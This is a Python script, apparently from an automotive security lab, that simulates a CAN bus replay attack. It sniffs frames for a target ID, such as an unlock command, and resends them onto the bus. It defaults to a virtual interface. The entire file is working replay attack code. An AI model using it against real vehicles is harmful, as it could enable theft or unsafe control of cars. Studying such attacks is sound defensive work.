#!/usr/bin/env python3
"""
Replay attack simulation.

Captures N seconds of live traffic for a target CAN ID, then — after a
delay — resends the captured frames verbatim onto the bus. This models an
attacker who sniffed a legitimate message (e.g. an unlock command) and
replays it later without needing to understand its meaning.
"""
import argparse
import time

import can


def capture(bus, target_id, duration):
    print(f"[capture] listening for ID 0x{target_id:03X} for {duration}s...")
    captured = []
    end = time.monotonic() + duration
    while time.monotonic() < end:
        msg = bus.recv(timeout=0.5)
        if msg and msg.arbitration_id == target_id:
            captured.append(msg.data)
            print(f"[capture] got frame: {msg.data.hex()}")
    return captured


def replay(bus, target_id, frames, delay, count, interval):
    print(f"[replay] waiting {delay}s before replaying...")
    time.sleep(delay)
    for i in range(count):
        for data in frames:
            msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
            bus.send(msg)
            print(f"[replay] sent (replayed) frame: {data.hex()}")
            time.sleep(interval)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--channel", default="vcan0")
    ap.add_argument("--id", type=lambda x: int(x, 0), default=0x400,
                     help="target CAN ID, e.g. 0x400")
    ap.add_argument("--capture-duration", type=float, default=5.0)
    ap.add_argument("--delay", type=float, default=5.0,
                     help="seconds to wait after capture before replaying")
    ap.add_argument("--replay-count", type=int, default=5,
                     help="how many times to resend the captured sequence")
    ap.add_argument("--replay-interval", type=float, default=0.5)
    args = ap.parse_args()

    bus = can.Bus(interface="socketcan", channel=args.channel)
    try:
        frames = capture(bus, args.id, args.capture_duration)
        if not frames:
            print("[!] No frames captured for that ID — is baseline_traffic.py running?")
            return
        replay(bus, args.id, frames, args.delay, args.replay_count, args.replay_interval)
    finally:
        bus.shutdown()


if __name__ == "__main__":
    main()
